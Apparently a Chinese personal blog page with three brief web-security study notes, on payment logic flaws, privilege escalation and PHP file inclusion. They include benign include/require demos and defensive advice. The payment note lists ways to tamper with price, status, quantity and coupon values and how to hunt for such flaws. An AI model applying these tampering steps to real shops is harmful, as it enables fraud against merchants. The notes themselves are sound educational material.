    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-06 16:37:00" itemprop="dateCreated datePublished" datetime="2022-12-06T16:37:00+08:00">2022-12-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><hr>
<h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接收支付结果有两种方式</p>
<h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户的网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据容易被篡改而降低安全性</p>
<h3 id="服务器端异步通知"><a href="#服务器端异步通知" class="headerlink" title="服务器端异步通知"></a>服务器端异步通知</h3><p>该方法是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST&#x2F;GET的方式</p>
<p>商户网站接收异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理。如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等</p>
<h2 id="常见支付漏洞"><a href="#常见支付漏洞" class="headerlink" title="常见支付漏洞"></a>常见支付漏洞</h2><p>修改支付的价格（支付三部曲–订购、订单、付款）</p>
<p>修改支付状态</p>
<p>修改订单数量</p>
<p>修改复数值（优惠卷）</p>
<h2 id="支付漏洞挖掘"><a href="#支付漏洞挖掘" class="headerlink" title="支付漏洞挖掘"></a>支付漏洞挖掘</h2><p>找到关键的数据包</p>
<p>分析数据包</p>
<p>不按套路出牌</p>
<p>PC端、WAP端、APP</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>后端检查每一项的值，包括支付状态</p>
<p>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量</p>
<p>与第三方支付平台检查，实际支付的金额是否与订单金额一致</p>
<p>支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改、重发攻击中的各种问题</p>
<p>金额超过阈值，进行人工审核</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/03/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/03/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">越权漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-03 18:36:25" itemprop="dateCreated datePublished" datetime="2022-12-03T18:36:25+08:00">2022-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><hr>
<h2 id="越权漏洞-1"><a href="#越权漏洞-1" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>由于没有对用户权限进行严格的判断，导致低权限的账号（如普通账号）可以去完成高权限账号（如超级管理员）范围内的操作</p>
<h2 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h2><p>A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况，就属于平行越权操作</p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A用户权限高于B用户，B用户越权操作A用户的权限，这一情况就属于垂直越权</p>
<p>越权漏洞属于逻辑漏洞，是由于权限校验的逻辑不够严谨严格</p>
<p>每个应用系统其用户对应的权限是根据其业务功能划分，而每个企业的业务又都是不一样的，因此越权漏洞很难通过扫描工具发现，往往需要通过手工进行测试</p>
<h2 id="交叉越权"><a href="#交叉越权" class="headerlink" title="交叉越权"></a>交叉越权</h2><p>既可以平行越权又可以垂直越权</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件包含漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-01 20:35:29" itemprop="dateCreated datePublished" datetime="2022-12-01T20:35:29+08:00">2022-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><hr>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>因为相同代码重复出现在不同文件中会 产生代码冗余</p>
<p>所以出现了文件包含函数，让代码更为高效</p>
<p>需要用到这部分代码就会去调用，且被包含的文件会被当做PHP代码执行</p>
<p>而且忽略后缀本身</p>
<p>注意：文件包含并不是漏洞，但是被包含的文件能够被攻击者控制就是漏洞</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含分为</p>
<p>本地包含（LFI）</p>
<p>远程包含（RFI） 【远程包含默认不开启 allow_url_include &#x3D; Off】</p>
<p>注意：他们可以转换，本地文件包含并不代表无法包含远程文件（SMB服务）</p>
<h2 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h2><h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>引用外部文件</p>
<p>只有代码执行到include代码段时，调用的外部文件才会被引用并读取</p>
<p>当引用的文件发生错误时，系统只会给出警告错误，而整个php文件会继续执行</p>
<h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h3><p>include()函数的区别是：</p>
<p>会在导入文件前先检测文件是否在该页面的其他部分被引用过，如果有，程序只能引用一次</p>
<p>如果导入的文件中存在自定义函数，那么在同一程序中重复导入该文件，在第二次导入时会发生错误</p>
<p>因为PHP不允许相同名称的函数重复声明</p>
<h3 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h3><p>引用外部文件</p>
<p>在PHP文件被执行之前，会先去把被包含文件的内容提取出来然后整合成新的php一起执行</p>
<p>当引用文件发生错误时，系统会报错，并停止执行下面代码</p>
<h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h3><p>与require()函数唯一区别是</p>
<p>会在导入文件前先检测文件是否在该页面的其他部分被引用过，如果有，程序只能引用一次</p>
<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
<p>对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
<p>建议 假定所有输入都是可疑的，尝试对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现..&#x2F;之类的目录跳转符</p>
<p>严格检查include类的文件包含函数中的参数是否外界可控</p>
<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;efg&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h2 id="include-1"><a href="#include-1" class="headerlink" title="include()"></a>include()</h2><p><strong>引用外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>执行结果：<br><img src="/Image-Chinese%5C20241017130647105.png" alt="在这里插入图片描述"></p>
<p><strong>引用不存在的[错误的]外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.jpg&quot;</span>); <span class="comment">//引用不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Copy</p>
<p>运行结果<br><img src="/Image-Chinese%5C20241017130648123.png" alt="在这里插入图片描述"></p>
<h2 id="include-once-1"><a href="#include-once-1" class="headerlink" title="include_once()"></a>include_once()</h2><p><strong>引用外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/Image-Chinese%5C20241017130648142.png" alt="在这里插入图片描述"></p>
<p><strong>引用不存在的[错误的]外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.jpg&quot;</span>); <span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/Image-Chinese%5C20241017130648158.png" alt="在这里插入图片描述"></p>
<h2 id="require-1"><a href="#require-1" class="headerlink" title="require()"></a>require()</h2><p><strong>引用存在的外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/Image-Chinese%5C20241017130648176.png" alt="在这里插入图片描述"><br><strong>引用不存在的[错误的]外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.jpg&quot;</span>);  <span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/Image-Chinese%5C20241017130648191.png" alt="在这里插入图片描述"></p>
<h2 id="require-once-1"><a href="#require-once-1" class="headerlink" title="require_once()"></a>require_once()</h2><p><strong>引用存在的外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/Image-Chinese%5C20241017130649209.png" alt="在这里插入图片描述"></p>
<p><strong>引用不存在的[错误的]外部文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.jpg&quot;</span>);<span class="comment">//不存在的1.jpg</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt; abc &lt;br /&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/Image-Chinese%5C20241017130649225.png" alt="在这里插入图片描述"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kiligwh</span>
</div>

<!-- 删除 “由 Hexo & NexT.Gemini 强力驱动” -->
<!--
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div> -->

<!-- <br /> -->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<!-- <span id="times">载入时分秒...</span> -->
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); 
        if(String(snum).length ==1 ){snum = "0" + snum;}
        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  



  <script src="/js/third-party/pace.js"></script>

  





  
  
  <script type="text/javascript"
	count="150"
	opacity: 1
	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
  </script>
  

</body>
</html>
